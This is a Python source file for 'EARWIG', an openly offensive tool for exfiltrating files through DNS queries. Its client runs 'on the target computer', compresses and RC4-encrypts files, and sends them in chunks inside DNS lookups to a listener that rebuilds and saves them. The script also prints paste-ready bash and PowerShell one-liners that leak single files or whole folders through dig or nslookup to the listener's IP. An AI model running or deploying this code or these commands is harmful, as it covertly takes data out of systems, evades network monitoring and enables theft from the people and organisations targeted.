#!/usr/bin/env python
# -*- coding: utf8 -*-

import socket
import sys
import binascii
import time
import hashlib
import zlib
import re
import base64
import argparse
from collections import defaultdict
import struct
import subprocess
import os
import random
import threading
import json
import logging
from datetime import datetime

colors = {
    "red": "\033[1;31m",
    "green": "\033[1;32m",
    "yellow": "\033[1;33m",
    "blue": "\033[1;34m",
    "purple": "\033[1;35m",
    "cyan": "\033[1;36m",
    "white": "\033[1;37m",
    "reset": "\033[0m",
    "bold": "\033[1m",
    "underline": "\033[4m",
    "bg_red": "\033[41m",
    "bg_green": "\033[42m",
    "bg_yellow": "\033[43m",
    "bg_blue": "\033[44m",
    "bg_purple": "\033[45m",
    "bg_cyan": "\033[46m"
}

class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        if isinstance(key, str):
            key = key.encode('utf-8')
        for i in range(256):
            self.x = (key[i % len(key)] + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    def binary_decrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)

    def binary_encrypt(self, data):
        return self.binary_decrypt(data)

class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.data_text = ''
        if len(data) < 12:
            return
        query_type = (data[2] >> 3) & 15
        if query_type == 0:
            start = 12
            if start >= len(data):
                return
            length = data[start]
            while length != 0 and start < len(data):
                if start + length + 1 > len(data):
                    break
                try:
                    self.data_text += data[start+1:start+length+1].decode('ascii') + '.'
                except:
                    break
                start += length + 1
                if start >= len(data):
                    break
                length = data[start]

    def request(self, ip):
        packet = bytearray(self.data[:2])
        packet += b'\x81\x80'
        packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'
        if len(self.data) > 12:
            packet += self.data[12:]
        packet += b'\xc0\x0c'
        packet += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
        packet += bytes(map(int, ip.split('.')))
        return bytes(packet)

def save_to_file(received_data, unzip, verbose):
    print("\n")
    for filename, data in received_data.items():
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        output_name = "received_%s_%s" % (timestamp, filename)
        flat_data = ""
        for block in data:
            flat_data += block[:-1].replace("*", "+") if block else ""
        try:
            f = open(output_name, "wb")
        except:
            print("%s[Error]%s Opening file '%s' to save data." % (colors["red"], colors["reset"], output_name))
            sys.exit(1)
        try:
            if verbose:
                print("%s[Info]%s base64 decoding data (%s)." % (colors["yellow"], colors["reset"], filename))
            flat_data = base64.b64decode(flat_data)
        except:
            f.close()
            print("%s[Error]%s Incorrect padding on base64 encoded data.." % (colors["red"], colors["reset"]))
            sys.exit(1)
        if unzip:
            if verbose:
                print("%s[Info]%s Unzipping data (%s)." % (colors["yellow"], colors["reset"], filename))
            try:
                x = zlib.decompressobj(16+zlib.MAX_WBITS)
                flat_data = x.decompress(flat_data)
            except:
                print("%s[Error]%s Could not unzip data, did you specify the -z switch ?" % (colors["red"], colors["reset"]))
                sys.exit(1)
            print("%s[Info]%s Saving received bytes to './%s'" % (colors["yellow"], colors["reset"], output_name))
            f.write(flat_data)
            f.close()
        else:
            print("%s[Info]%s Saving bytes to './%s'" % (colors["yellow"], colors["reset"], output_name))
            f.write(flat_data)
            f.close()
        print("%s[md5sum]%s '%s'\n" % (colors["green"], colors["reset"], hashlib.md5(open(output_name, "rb").read()).hexdigest()))

def show_progress(current, total, status=''):
    bar_length = 60
    filled_length = int(round(bar_length * current / float(total)))
    percent = round(100.0 * current / float(total), 1)
    bar = '=' * filled_length + '-' * (bar_length - filled_length)
    sys.stdout.write('[%s] %s%%\t%s\t\r' % (bar, percent, status))
    sys.stdout.flush()

def decode_base64url(msg):
    msg = msg.replace('_', '/').replace('-', '+')
    if len(msg) % 4 == 3:
        return base64.b64decode(msg + '=')
    elif len(msg) % 4 == 2:
        return base64.b64decode(msg + '==')
    elif len(msg) % 4 == 1:
        return base64.b64decode(msg + '===')
    else:
        return base64.b64decode(msg)

def decode_base32(msg):
    mod = len(msg) % 8
    if mod == 0:
        padding = ""
    elif mod == 1:
        padding = "======="
    elif mod == 2:
        padding = "======"
    elif mod == 3:
        padding = "====="
    elif mod == 4:
        padding = "===="
    elif mod == 5:
        padding = "==="
    elif mod == 6:
        padding = "=="
    elif mod == 7:
        padding = "="
    else:
        padding = ""
    return base64.b32decode(msg.upper() + padding)

def encode_base64url(data):
    return base64.b64encode(data).decode('ascii').replace('+', '-').replace('/', '_').rstrip('=')

def encode_base32(data):
    return base64.b32encode(data).decode('ascii')

class SendFiles:
    def __init__(self, server_ip, domain="", password=None, use_base32=False,
                 chunks=4, chunk_size=57, filename_size=17, compress=True,
                 max_retries=3, timeout=5):
        self.server_ip = server_ip
        self.domain = domain
        self.password = password
        self.use_base32 = use_base32
        self.chunks = chunks
        self.chunk_size = chunk_size
        self.filename_size = filename_size
        self.compress = compress
        self.max_retries = max_retries
        self.timeout = timeout
        self.rc4 = RC4(password) if password else None
        self.sock = None
        self.state_file = ".earwig_state.json"

    def send_file(self, filepath):
        if not os.path.exists(filepath):
            print("%s[Error]%s File not found: %s" % (colors["red"], colors["reset"], filepath))
            return False

        file_size = os.path.getsize(filepath)
        if file_size > 100 * 1024 * 1024:
            print("%s[Error]%s File too large (max 100MB)" % (colors["red"], colors["reset"]))
            return False

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(self.timeout)

        with open(filepath, 'rb') as f:
            data = f.read()

        original_name = os.path.basename(filepath)
        original_mtime = os.path.getmtime(filepath)
        original_mode = oct(os.stat(filepath).st_mode)[-3:]

        metadata = f"{original_name}|{original_mtime}|{original_mode}"

        if self.compress:
            data = zlib.compress(data, 6)

        if self.rc4:
            data = self.rc4.binary_encrypt(bytearray(data))

        if self.use_base32:
            encoded = encode_base32(data)
        else:
            encoded = encode_base64url(data)

        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        total_chunks = len(chunks)

        print("%s[+]%s Sending file: %s (%d pieces, %d bytes)" %
              (colors["green"], colors["reset"], original_name, total_chunks, file_size))

        init_message = "%s|%d|%d" % (original_name, total_chunks, int(original_mtime))
        if self.use_base32:
            init_encoded = encode_base32(init_message)
            init_domain = "start.%s.base32.%s" % (init_encoded, self.domain)
        else:
            init_encoded = encode_base64url(init_message)
            init_domain = "start.%s.base64.%s" % (init_encoded, self.domain)

        if not self._send_with_retry(init_domain, is_init=True):
            print("%s[Error]%s Failed to send initialization" % (colors["red"], colors["reset"]))
            self.sock.close()
            return False

        self._save_state(original_name, total_chunks, [])

        for i, chunk in enumerate(chunks):
            chunk_domain = "%d.%s.%s" % (i, chunk, self.domain)
            success = self._send_with_retry(chunk_domain)
            if not success:
                print("\n%s[Error]%s Failed to send chunk %d" % (colors["red"], colors["reset"], i))
                self.sock.close()
                return False

            received = [i for i in range(i+1)]
            self._save_state(original_name, total_chunks, received)
            show_progress(i+1, total_chunks, f"Sending {original_name}")

        print("\n%s[+]%s File sent successfully!" % (colors["green"], colors["reset"]))
        self.sock.close()
        self._cleanup_state()
        return True

    def _send_with_retry(self, query, is_init=False):
        for attempt in range(self.max_retries):
            try:
                response = self._send_dns_query(query)
                if response or is_init:
                    return True
                if attempt < self.max_retries - 1:
                    time.sleep(self.timeout * (attempt + 1))
            except:
                if attempt < self.max_retries - 1:
                    time.sleep(self.timeout * (attempt + 1))
                continue
        return False

    def _send_dns_query(self, query):
        try:
            cmd = ["dig", "@%s" % self.server_ip, query, "+short", "+timeout=%d" % self.timeout]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout)
            if result.returncode == 0 and result.stdout:
                return True
        except:
            pass

        try:
            packet = self._build_query_packet(query)
            self.sock.sendto(packet, (self.server_ip, 53))
            try:
                response, _ = self.sock.recvfrom(512)
                if response and len(response) > 0:
                    return True
            except socket.timeout:
                return False
        except:
            return False
        return False

    def _build_query_packet(self, domain):
        txid = random.randint(0, 65535)
        header = struct.pack('>HHHHHH', txid, 0x0100, 0x0001, 0x0000, 0x0000, 0x0000)
        qname = b''
        for part in domain.split('.'):
            if len(part) > 63:
                part = part[:63]
            qname += bytes([len(part)]) + part.encode('ascii', errors='ignore')
        qname += b'\x00'
        qtype = struct.pack('>HH', 1, 1)
        return header + qname + qtype

    def _save_state(self, filename, total, received):
        try:
            with open(self.state_file, 'w') as f:
                json.dump({
                    'filename': filename,
                    'total': total,
                    'received': received,
                    'timestamp': time.time()
                }, f)
        except:
            pass

    def _cleanup_state(self):
        try:
            if os.path.exists(self.state_file):
                os.remove(self.state_file)
        except:
            pass

class ReceiveFiles:
    def __init__(self, listen_ip="0.0.0.0", password=None, verbose=False,
                 use_encryption=False, use_base32=False, chunk_timeout=60,
                 max_concurrent=10):
        self.listen_ip = listen_ip
        self.password = password
        self.verbose = verbose
        self.use_encryption = use_encryption
        self.use_base32 = use_base32
        self.chunk_timeout = chunk_timeout
        self.max_concurrent = max_concurrent
        self.rc4 = RC4(password) if password else None

        self.subdomains = 4
        self.bytes_per = 57
        self.filename_length = 17
        self.received_data = {}
        self.legacy_data = {}

        self.chunks = defaultdict(dict)
        self.expected_chunks = {}
        self.filenames = {}
        self.encodings = {}
        self.last_chunk_time = defaultdict(float)
        self.completed_files = set()
        self.lock = threading.Lock()
        self.active_threads = 0

    def start(self):
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            udp.bind((self.listen_ip, 53))
        except:
            print("%s[Error]%s Cannot start server on %s:53" % (colors["red"], colors["reset"], self.listen_ip))
            sys.exit(1)

        print("%s[+]%s DNS server running on %s:53" % (colors["green"], colors["reset"], self.listen_ip))
        print("%s[+]%s Press Ctrl+C to save received files" % (colors["green"], colors["reset"]))

        monitor_thread = threading.Thread(target=self._monitor_timeouts, daemon=True)
        monitor_thread.start()

        try:
            while True:
                data, address = udp.recvfrom(1024)
                if self.active_threads < self.max_concurrent:
                    thread = threading.Thread(target=self._handle_request, args=(data, address, udp))
                    thread.daemon = True
                    thread.start()
                    self.active_threads += 1
                else:
                    self._handle_request(data, address, udp)
        except KeyboardInterrupt:
            print("\n%s[!]%s Saving received files..." % (colors["red"], colors["reset"]))
            self._save_all_files()
            print("%s[!]%s Server stopped" % (colors["red"], colors["reset"]))
            udp.close()

    def _handle_request(self, data, address, udp):
        try:
            query = DNSQuery(data)
            udp.sendto(query.request(self.listen_ip), address)

            query_text = query.data_text.rstrip('.')

            if self.verbose:
                print("%s[>>]%s %s -> %s" % (colors["blue"], colors["reset"], query_text, self.listen_ip))

            if not query_text:
                return

            if query_text.startswith("start."):
                self._handle_start(query_text)
            elif '.ack.' in query_text:
                self._handle_ack(query_text)
            elif '.' in query_text and query_text[0].isdigit():
                self._handle_chunk(query_text)
            else:
                self._handle_legacy(query_text)

            self.active_threads -= 1
        except Exception as e:
            if self.verbose:
                print("%s[Error]%s %s" % (colors["red"], colors["reset"], str(e)))
            self.active_threads -= 1

    def _handle_start(self, query_text):
        parts = query_text.split('.')
        if len(parts) < 4:
            return

        try:
            encoded_message = parts[1]
            encoding_type = parts[2]

            if encoding_type.lower() == "base32":
                message = decode_base32(encoded_message)
                self.use_base32 = True
            else:
                message = decode_base64url(encoded_message)
                self.use_base32 = False

            if isinstance(message, bytes):
                message = message.decode('ascii')

            parts = message.split('|')
            filename = parts[0]
            total_chunks = int(parts[1])
            mtime = int(parts[2]) if len(parts) > 2 else int(time.time())

            with self.lock:
                if filename in self.completed_files:
                    return

                self.filenames[filename] = filename
                self.expected_chunks[filename] = total_chunks
                self.chunks[filename] = {}
                self.last_chunk_time[filename] = time.time()

            print("\n%s[+]%s Receiving file: %s (%d pieces)" %
                  (colors["green"], colors["reset"], filename, total_chunks))

            self._send_ack(-1, filename)

        except Exception as e:
            if self.verbose:
                print("%s[Error]%s Could not process start packet: %s" % (colors["red"], colors["reset"], str(e)))

    def _handle_chunk(self, query_text):
        parts = query_text.split('.')
        if len(parts) < 2:
            return

        try:
            chunk_num = int(parts[0])
            chunk_data = '.'.join(parts[1:-1])

            with self.lock:
                for filename in list(self.expected_chunks.keys()):
                    if filename in self.completed_files:
                        continue

                    if chunk_num < self.expected_chunks[filename]:
                        if chunk_num not in self.chunks[filename]:
                            self.chunks[filename][chunk_num] = chunk_data
                            self.last_chunk_time[filename] = time.time()

                            if len(self.chunks[filename]) % 10 == 0:
                                self._show_progress(filename)

                            if len(self.chunks[filename]) == self.expected_chunks[filename]:
                                self._build_file(filename)
                        break

        except Exception as e:
            if self.verbose:
                print("%s[Error]%s Could not process chunk: %s" % (colors["red"], colors["reset"], str(e)))

    def _handle_ack(self, query_text):
        if self.verbose:
            print("%s[ACK]%s %s" % (colors["green"], colors["reset"], query_text))

    def _send_ack(self, chunk_num, filename):
        try:
            ack_domain = f"ack.{chunk_num}.{filename}.complete"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = self._build_response_packet(ack_domain)
            sock.sendto(packet, (self.listen_ip, 53))
            sock.close()
        except:
            pass

    def _build_response_packet(self, domain):
        txid = random.randint(0, 65535)
        header = struct.pack('>HHHHHH', txid, 0x8180, 0x0001, 0x0001, 0x0000, 0x0000)
        qname = b''
        for part in domain.split('.'):
            if len(part) > 63:
                part = part[:63]
            qname += bytes([len(part)]) + part.encode('ascii', errors='ignore')
        qname += b'\x00'
        qtype = struct.pack('>HH', 1, 1)
        answer = b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
        answer += socket.inet_aton(self.listen_ip)
        return header + qname + qtype + answer

    def _build_file(self, filename):
        with self.lock:
            if filename in self.completed_files:
                return

            print("\n%s[+]%s Building file: %s" % (colors["green"], colors["reset"], filename))

            chunks = []
            missing = []
            for i in range(self.expected_chunks[filename]):
                if i in self.chunks[filename]:
                    chunks.append(self.chunks[filename][i])
                else:
                    missing.append(i)

            if missing:
                print("%s[Warning]%s Missing pieces: %s" % (colors["yellow"], colors["reset"], missing[:10]))
                if len(missing) > 10:
                    print("%s[Warning]%s ... and %d more" % (colors["yellow"], colors["reset"], len(missing)-10))
                return

            encoded_data = ''.join(chunks)

            try:
                if self.use_base32:
                    data = decode_base32(encoded_data)
                else:
                    data = decode_base64url(encoded_data)
            except Exception as e:
                print("%s[Error]%s Could not decode data: %s" % (colors["red"], colors["reset"], str(e)))
                return

            if self.rc4:
                try:
                    data = self.rc4.binary_decrypt(bytearray(data))
                except:
                    print("%s[Error]%s Could not decrypt data" % (colors["red"], colors["reset"]))
                    return

            decompressed = False
            try:
                data = zlib.decompress(data)
                decompressed = True
            except:
                pass

            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
            output_name = "received_%s_%s" % (timestamp, filename)

            try:
                with open(output_name, 'wb') as f:
                    f.write(data)

                print("%s[+]%s File saved as: %s (%d bytes)" %
                      (colors["green"], colors["reset"], output_name, len(data)))
                print("%s[Check sum]%s %s" % (colors["green"], colors["reset"],
                                              hashlib.md5(data).hexdigest()))
                if decompressed:
                    print("%s[Info]%s Decompressed" % (colors["yellow"], colors["reset"]))

                self.completed_files.add(filename)
                self._send_ack(-2, filename)

            except Exception as e:
                print("%s[Error]%s Could not save file: %s" % (colors["red"], colors["reset"], str(e)))

            del self.chunks[filename]
            del self.expected_chunks[filename]
            if filename in self.last_chunk_time:
                del self.last_chunk_time[filename]

    def _show_progress(self, filename):
        with self.lock:
            if filename not in self.chunks:
                return
            received = len(self.chunks[filename])
            total = self.expected_chunks.get(filename, 1)
            show_progress(received, total, f"Receiving {filename}")

    def _monitor_timeouts(self):
        while True:
            time.sleep(5)
            with self.lock:
                current_time = time.time()
                for filename in list(self.last_chunk_time.keys()):
                    if filename in self.completed_files:
                        continue
                    if current_time - self.last_chunk_time[filename] > self.chunk_timeout:
                        if self.verbose:
                            print("\n%s[Warning]%s Timeout for %s" %
                                  (colors["yellow"], colors["reset"], filename))
                        self._build_file(filename)

    def _handle_legacy(self, query_text):
        parts = query_text.split('.')
        if len(parts) < 2:
            return

        filename = None
        data_parts = []

        for part in parts:
            if part.endswith('-'):
                data_parts.append(part)
            else:
                if filename is None:
                    filename = part
                else:
                    filename += '.' + part

        if filename is None:
            return

        if filename not in self.legacy_data:
            self.legacy_data[filename] = []

        for part in data_parts:
            self.legacy_data[filename].append(part)

        if self.verbose:
            print("%s[>]%s Received data for: %s (%d bytes)" %
                  (colors["yellow"], colors["reset"], filename, len(query_text)))

    def _save_all_files(self):
        with self.lock:
            for filename in list(self.chunks.keys()):
                if filename in self.completed_files:
                    continue
                if len(self.chunks[filename]) == self.expected_chunks.get(filename, 0):
                    self._build_file(filename)
                else:
                    received = len(self.chunks[filename])
                    total = self.expected_chunks.get(filename, 0)
                    print("%s[Warning]%s Incomplete %s: %d/%d" %
                          (colors["yellow"], colors["reset"], filename, received, total))
                    if received > 0:
                        self._build_file(filename)

        if self.legacy_data:
            save_to_file(self.legacy_data, False, self.verbose)

def show_banner():
    print("""
%s
%s⣿⣿⣿⣷⣦⠀⠀⠀⠈⣷⣄⠀⠀⠀⣠⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣷⣦⠀⠀⠀⠈⣷⣄⠀⠀⠀⣠⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢿⣿⣿⠟⢁⣴⣿⣶⡄⢸⣿⣷⣄⠐⠟⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠿⢁⣴⣿⣿⣿⣿⠋⠀⢻⣿⣿⣷⡄⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⠟⢁⣴⣷⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣄⣀⣈⠛⠁⠴⢿⣿⣿⣧⠈⣿⣿⣿⣿⣧⠀⠶⠶⠆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠻⣿⣿⣷⣶⣤⣄⣉⠙⠂⠘⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⠻⢿⣿⣿⣿⣿⣿⣷⣦⡈⠛⢁⣤⣤⣤⠀⣠⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⡾⠋⠀⠀⡉⠻⢿⣿⣿⣿⣿⠁⣴⣿⣿⣿⣇⠀⣿⣿⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⠀⠈⡉⠛⠋⠀⡿⠿⢿⣿⣿⣷⣬⠉⣤⣴⣶⣶⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⢸⡇⠀⠀⠀⢠⣴⣄⠈⣿⠿⠃⠀⠉⠉⠛⢿⣇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡿⣀⣤⠀⠀⠀⠀⠀⠀⠀⠹⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
%s
-- EARWIG by SYLHETYHACKVENGER (THE-ERROR808) --
%s
Send and receive files secretly through DNS requests
%s""" % (colors["green"], colors["green"], colors["reset"], colors["cyan"], colors["reset"]))

def show_help():
    print("""
%s
How to use EARWIG:
%s
%sChoose one of these modes:%s
  %sserver%s    - Receive files (run this on your computer)
  %sclient%s    - Send files (run this on the target computer)

%sServer options (receiving files):%s
  %s-i, --ip IP%s          IP address to listen on (default: 0.0.0.0)
  %s-p, --password PASS%s  Password to decrypt files
  %s-v, --verbose%s        Show more details while running
  %s-z, --zip%s            Unzip files when received (legacy mode)
  %s-s, --chunks N%s         Number of pieces per request (default: 4)
  %s-b, --bytes N%s         Size of each piece (default: 57, max: 63)
  %s-f, --flen N%s         Length of filename (default: 17)
  %s-t, --timeout N%s      Chunk timeout in seconds (default: 60)
  %s-c, --concurrent N%s   Max concurrent threads (default: 10)

%sClient options (sending files):%s
  %s-t, --target IP%s      IP of the DNS server (required)
  %s-d, --domain DOMAIN%s  Domain name to use (required)
  %s-p, --password PASS%s  Password to encrypt files
  %s-f, --file FILE%s      File to send (required)
  %s-b32, --base32%s       Use Base32 instead of Base64URL
  %s-c, --compress%s       Compress file before sending (default: on)
  %s-n, --no-compress%s    Turn off compression
  %s-s, --chunks N%s         Number of pieces per request (default: 4)
  %s-B, --chunk-size N%s   Size of each piece (default: 57)
  %s-r, --retries N%s      Max retries per chunk (default: 3)
  %s-w, --timeout N%s      Timeout in seconds (default: 5)

%sExamples:%s
  %s# Start server to receive files%s
  %searwig.py server -i 0.0.0.0 -p mypassword -v%s

  %s# Send a file to the server%s
  %searwig.py client -t 192.168.1.100 -d example.com -p mypassword -f secret.zip%s

  %s# Use legacy mode (old EARWIG format)%s
  %searwig.py server -i 0.0.0.0 -z -s 4 -b 57 -f 17%s
%s""" % (colors["bold"], colors["reset"], colors["yellow"], colors["reset"],
         colors["green"], colors["reset"], colors["green"], colors["reset"],
         colors["cyan"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["cyan"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["purple"], colors["reset"], colors["purple"], colors["reset"],
         colors["yellow"], colors["reset"], colors["white"], colors["reset"],
         colors["green"], colors["reset"], colors["white"], colors["reset"],
         colors["green"], colors["reset"], colors["white"], colors["reset"],
         colors["green"], colors["reset"], colors["reset"]))

def show_example_commands(subdomains, bytes_per, ip, zip_mode):
    print("\n%s[+]%s On the target computer, use these commands to send files:" % (colors["green"], colors["reset"]))
    print("%s[+]%s Replace %sfilename%s with the actual file name." % (colors["green"], colors["reset"], colors["yellow"], colors["reset"]))
    print()

    if zip_mode:
        print("%s[?]%s Send one file (with compression)" % (colors["yellow"], colors["reset"]))
        print("""\t%s#%s filename=secret.txt; pieces=%s; size=%s; count=0; for chunk in $(for i in $(gzip -c $filename| base64 -w0 | sed "s/.\\{%s\\}/&\\n/g");do if [[ "$count" -lt "$pieces" ]]; then echo -ne "$chunk-."; count=$(($count+1)); else echo -ne "\\n$chunk-."; count=1; fi; done ); do dig @%s `echo -ne $chunk$filename|tr "+" "*"` +short; done """ % (colors["red"], colors["reset"], subdomains, bytes_per, bytes_per, ip))
        print()
        print("%s[?]%s Send entire folder (with compression)" % (colors["yellow"], colors["reset"]))
        print("""\t%s#%s for f in $(ls .); do pieces=%s; size=%s; count=0; for chunk in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{%s\\}/&\\n/g");do if [[ "$count" -lt "$pieces" ]]; then echo -ne "$chunk-."; count=$(($count+1)); else echo -ne "\\n$chunk-."; count=1; fi; done ); do dig @%s `echo -ne $chunk$f|tr "+" "*"` +short; done ; done""" % (colors["red"], colors["reset"], subdomains, bytes_per, bytes_per, ip))
    else:
        print("%s[?]%s Send one file" % (colors["yellow"], colors["reset"]))
        print("""\t%s#%s filename=secret.txt; pieces=%s; size=%s; count=0; for chunk in $(for i in $(base64 -w0 $filename| sed "s/.\\{%s\\}/&\\n/g");do if [[ "$count" -lt "$pieces" ]]; then echo -ne "$chunk-."; count=$(($count+1)); else echo -ne "\\n$chunk-."; count=1; fi; done ); do dig @%s `echo -ne $chunk$filename|tr "+" "*"` +short; done """ % (colors["red"], colors["reset"], subdomains, bytes_per, bytes_per, ip))
        print()
        print("%s[?]%s Send entire folder" % (colors["yellow"], colors["reset"]))
        print("""\t%s#%s for f in $(ls .); do pieces=%s; size=%s; count=0; for chunk in $(for i in $(base64 -w0 $f | sed "s/.\\{%s\\}/&\\n/g");do if [[ "$count" -lt "$pieces" ]]; then echo -ne "$chunk-."; count=$(($count+1)); else echo -ne "\\n$chunk-."; count=1; fi; done ); do dig @%s `echo -ne $chunk$f|tr "+" "*"` +short; done ; done""" % (colors["red"], colors["reset"], subdomains, bytes_per, bytes_per, ip))
        print()
        print("%s[?]%s Send entire folder in PowerShell" % (colors["yellow"], colors["reset"]))
        print("""\t%s#%s $d="%s"; $pieces=%s; $size=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$size)) { $c=$size; if (($n*$size)+$c -gt $l) { $c=$l-($n*$size) }; $r+=$e.Substring($n*$size, $c) + "-."; if (($n%%$pieces) -eq ($pieces-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }""" % (colors["red"], colors["reset"], ip, subdomains, bytes_per))

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ['-h', '--help']:
        show_banner()
        show_help()
        sys.exit(0)

    mode = sys.argv[1].lower()
    sys.argv = [sys.argv[0]] + sys.argv[2:]

    if mode == 'server':
        show_banner()

        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument('-i', '--ip', default='0.0.0.0', help='IP address to listen on')
        parser.add_argument('-p', '--password', help='Password to decrypt files')
        parser.add_argument('-v', '--verbose', action='store_true', help='Show more details')
        parser.add_argument('-z', '--zip', action='store_true', help='Unzip files when received')
        parser.add_argument('-s', '--chunks', type=int, default=4, help='Pieces per request')
        parser.add_argument('-b', '--bytes', type=int, default=57, help='Size of each piece')
        parser.add_argument('-f', '--flen', type=int, default=17, help='Filename length')
        parser.add_argument('-t', '--timeout', type=int, default=60, help='Chunk timeout in seconds')
        parser.add_argument('-c', '--concurrent', type=int, default=10, help='Max concurrent threads')
        parser.add_argument('--legacy', action='store_true', help='Use old EARWIG format')

        args, unknown = parser.parse_known_args()

        if args.bytes > 63 or (args.bytes * args.chunks) > 253 or ((args.bytes * args.chunks) + args.flen) > 253:
            print("%s[Error]%s Total query size cannot exceed 253 bytes. See help (-h)" % (colors["red"], colors["reset"]))
            sys.exit(1)

        if args.legacy:
            server = ReceiveFiles(args.ip, args.password, args.verbose, chunk_timeout=args.timeout, max_concurrent=args.concurrent)
            server.subdomains = args.chunks
            server.bytes_per = args.bytes
            server.filename_length = args.flen
            show_example_commands(args.chunks, args.bytes, args.ip, args.zip)
            server.start()
        else:
            server = ReceiveFiles(args.ip, args.password, args.verbose,
                                 use_encryption=bool(args.password),
                                 chunk_timeout=args.timeout,
                                 max_concurrent=args.concurrent)
            print("%s[+]%s Advanced mode enabled" % (colors["green"], colors["reset"]))
            if args.password:
                print("%s[+]%s Encryption is ON" % (colors["green"], colors["reset"]))
            server.start()

    elif mode == 'client':
        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument('-t', '--target', required=True, help='IP address of DNS server')
        parser.add_argument('-d', '--domain', required=True, help='Domain name to use')
        parser.add_argument('-p', '--password', help='Password to encrypt files')
        parser.add_argument('-f', '--file', required=True, help='File to send')
        parser.add_argument('-b32', '--base32', action='store_true', help='Use Base32 instead of Base64')
        parser.add_argument('-c', '--compress', action='store_true', default=True, help='Compress file before sending')
        parser.add_argument('-n', '--no-compress', dest='compress', action='store_false', help='Turn off compression')
        parser.add_argument('-s', '--chunks', type=int, default=4, help='Pieces per request')
        parser.add_argument('-B', '--chunk-size', type=int, default=57, help='Size of each piece')
        parser.add_argument('-r', '--retries', type=int, default=3, help='Max retries per chunk')
        parser.add_argument('-w', '--timeout', type=int, default=5, help='Timeout in seconds')

        args, unknown = parser.parse_known_args()

        show_banner()
        print("%s[+]%s Starting file transfer..." % (colors["green"], colors["reset"]))

        client = SendFiles(args.target, args.domain, args.password,
                          args.base32, args.chunks, args.chunk_size,
                          filename_size=17, compress=args.compress,
                          max_retries=args.retries, timeout=args.timeout)

        try:
            success = client.send_file(args.file)
            if not success:
                sys.exit(1)
        except Exception as e:
            print("%s[Error]%s Failed to send file: %s" % (colors["red"], colors["reset"], str(e)))
            sys.exit(1)

    else:
        show_banner()
        print("%s[Error]%s Unknown mode: %s" % (colors["red"], colors["reset"], mode))
        show_help()
        sys.exit(1)

if __name__ == '__main__':
    main()
